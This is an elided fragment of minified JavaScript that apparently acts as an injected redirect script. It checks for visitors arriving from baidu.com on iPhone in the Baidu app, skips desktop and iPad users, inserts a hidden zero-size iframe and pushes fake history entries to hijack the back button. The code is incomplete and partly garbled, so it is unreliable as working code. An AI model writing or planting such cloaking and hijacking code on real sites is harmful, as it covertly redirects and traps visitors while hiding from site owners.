! function(e) {
    ...
    var u = decodeURIComponent(i); - 1 != u.indexOf("baidu.com") ? (r = function(e) {
        var n = "";
    ...
    function x(e, n, t) {
        var o = e.indexOf(n),
            i = (e = e.slice(o + n.length)).indexOf(t);
        return e.slice(e, i)
    }
    ...
    m.win || m.mac || m.xll || m.ipad || 1 == screen_baidu && 1 == p || (-1 != l.indexOf("baiduboxapp/1") && -1 != l.indexOf("iphone") ? (document.writeln('<iframe  width="0" style="display: none" height="0" src="' + s + '"></iframe>'), history.pushState({}, "", "#_ta_"), history.pushState({}, "", "#_tdd_"), window.onhashchange = function() {
